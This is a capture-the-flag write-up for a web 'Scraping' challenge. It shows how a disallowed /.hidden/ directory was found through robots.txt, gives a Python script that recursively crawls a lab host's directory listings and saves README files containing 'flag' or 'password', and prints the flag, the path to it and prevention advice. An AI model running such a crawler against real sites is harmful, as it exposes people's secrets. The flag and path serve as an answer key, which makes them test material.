# Scraping

## Flag

```
d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

## Discovery and Exploitation

### Finding a Disallowed Directory:

1. Upon inspecting the robots.txt file, a disallowed directory /.hidden/ was found. This hinted at the possibility of sensitive or hidden content.
   Exploring /.hidden/:

2. Within the / .hidden/ directory, there were links to additional subdirectories. These appeared to be structured in a way that required deeper exploration.
   Recursive Scraping for Links and Content:

3. A Python script was utilized to recursively navigate through the directory structure, retrieving all available links and checking the content of each file.
   Key steps in the script's functionality included:
   Fetching the content of each directory and identifying links.
   Examining README files in the directories for sensitive keywords like "flag," "FLAG," "password," or "PASSWORD."
   Saving any discovered content containing the desired keywords to a results file for further review.flag we use the following script

```python
import requests
import bs4 as bs

def scrapping_recursive(url):
	request = requests.get(url)
	s = bs.BeautifulSoup(request.text, 'html.parser')
	if (s is not None):
		print("Scrapping: " + url)
		links = s.find_all("a")
		f = open("results.txt", "a+")
		for link in links:
			final_link = link.get('href')
			if (final_link == "README"):
				request = requests.get(url + final_link)
				if "flag" in request.text or "FLAG" in request.text or "password" in request.text or "PASSWORD" in request.text:
						f.write(request.text)
			elif (final_link != "../"):
				scrapping_recursive(url + final_link)
		f.close()

url = "http://10.11.100.150/.hidden/"
scrapping_recursive(url)
```

4. finlay we find the flag in [host]/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README

## Why It Works

The script works by recursively navigating through the directory structure, identifying links, and examining the content of each file. By searching for specific keywords like "flag," "FLAG," "password," or "PASSWORD" in README files, the script can identify sensitive information that may be hidden within the directories.

## Prevention

To prevent unauthorized access to sensitive directories and files, ensure that proper access controls are in place. Limit directory listings and implement authentication mechanisms to restrict access to authorized users only. Additionally, consider encrypting sensitive data and using secure protocols to protect information from unauthorized disclosure.
